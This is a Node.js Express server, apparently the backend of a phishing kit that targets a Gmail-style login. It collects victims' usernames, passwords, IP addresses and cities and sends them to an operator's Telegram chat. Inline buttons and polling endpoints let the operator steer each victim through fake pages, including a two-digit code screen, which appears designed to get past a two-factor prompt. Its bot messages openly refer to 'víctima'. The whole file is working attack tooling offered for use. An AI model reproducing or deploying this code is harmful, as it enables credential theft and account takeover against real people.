const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const CLIENTES_DIR = './clientes';
if (!fs.existsSync(CLIENTES_DIR)) {
  fs.mkdirSync(CLIENTES_DIR);
}

// Limpieza automática cada 10 minutos (archivos > 15 min)
setInterval(() => {
  const files = fs.readdirSync(CLIENTES_DIR);
  const ahora = Date.now();

  files.forEach(file => {
    const fullPath = path.join(CLIENTES_DIR, file);
    const stats = fs.statSync(fullPath);
    const edadMinutos = (ahora - stats.mtimeMs) / 60000;

    if (edadMinutos > 15) {
      fs.unlinkSync(fullPath);
      console.log(`Eliminado: ${file} (${Math.round(edadMinutos)} min)`);
    }
  });
}, 10 * 60 * 1000);

function guardarCliente(txid, data) {
  const ruta = path.join(CLIENTES_DIR, `${txid}.json`);
  fs.writeFileSync(ruta, JSON.stringify(data, null, 2));
}

function cargarCliente(txid) {
  const ruta = path.join(CLIENTES_DIR, `${txid}.json`);
  if (fs.existsSync(ruta)) {
    return JSON.parse(fs.readFileSync(ruta));
  }
  return null;
}

// Recibir credenciales
app.post('/enviar', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad } = req.body;

  const mensaje = `
GM4YL
ID: <code>${txid}</code>

US4R: <code>${usar}</code>
CL4V: <code>${clavv}</code>

IP: ${ip}
Ciudad: ${ciudad}
`;

  const cliente = {
    status: "esperando",
    codigo: null,
    usar,
    clavv,
    ip,
    ciudad
  };
  guardarCliente(txid, cliente);

  const keyboard = {
    inline_keyboard: [
      [
        { text: "CONFIRMAR", callback_data: `confirmar:${txid}` },
        { text: "CÓDIGO", callback_data: `codigo:${txid}` },
        { text: "ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});

// Webhook de Telegram
app.post('/webhook', async (req, res) => {
  // Botones inline
  if (req.body.callback_query) {
    const callback = req.body.callback_query;
    const data = callback.data;
    const [accion, txid] = data.split(':');

    const cliente = cargarCliente(txid);
    if (!cliente) return res.sendStatus(404);

    cliente.status = accion; // confirmar | codigo | errorlogo
    guardarCliente(txid, cliente);

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callback.id,
        text: `Acción: ${accion.toUpperCase()}`
      })
    });

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: callback.message.chat.id,
        text: `Acción "${accion}" aplicada al ID ${txid}`
      })
    });

    return res.sendStatus(200);
  }

  // Comando /txid 22
  if (req.body.message?.text?.startsWith('/')) {
    const texto = req.body.message.text.trim();
    const partes = texto.split(' ');
    const txid = partes[0].slice(1);
    const codigoStr = partes[1]?.trim();

    const cliente = cargarCliente(txid);
    if (!cliente) {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: req.body.message.chat.id,
          text: `No existe sesión con ID: ${txid}`
        })
      });
      return res.sendStatus(200);
    }

    if (codigoStr && /^\d{2}$/.test(codigoStr)) {
      cliente.codigo = codigoStr;
      cliente.status = "codigo";
      guardarCliente(txid, cliente);

      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: req.body.message.chat.id,
          text: `Código "${codigoStr}" enviado\nVíctima redirigida a pantalla de 2 dígitos`
        })
      });
    } else {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: req.body.message.chat.id,
          text: `Formato incorrecto.\nUsa: /${txid} 22`
        })
      });
    }

    return res.sendStatus(200);
  }

  res.sendStatus(200);
});

// Endpoint principal para polling (cargs.html, otro4.html, etc.)
app.get('/api/status', (req, res) => {
  const txid = req.query.txid;
  if (!txid) return res.status(400).json({ error: "Falta txid" });

  const cliente = cargarCliente(txid);
  if (!cliente) return res.status(404).json({ error: "Sesión no encontrada" });

  res.json({
    status: cliente.status || "esperando"
  });
});

app.get('/api/status', (req, res) => {
  const txid = req.query.txid;
  if (!txid) return res.status(400).json({ error: "Falta txid" });

  const cliente = cargarCliente(txid);

  // Si no existe aún, mantenlo en esperando
  if (!cliente) return res.json({ status: "esperando" });

  res.json({
    status: cliente.status || "esperando"
  });
});

// Endpoint para obtener solo el código de 2 dígitos (otro3.html)
app.get('/status', (req, res) => {
  const txid = req.query.txid;
  if (!txid) return res.status(400).json({ error: "Falta txid" });

  const cliente = cargarCliente(txid);
  if (!cliente) return res.status(404).json({ error: "No encontrado" });

  res.json({ codigo: cliente.codigo || null });
});

app.get('/', (req, res) => res.send("Servidor activo"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
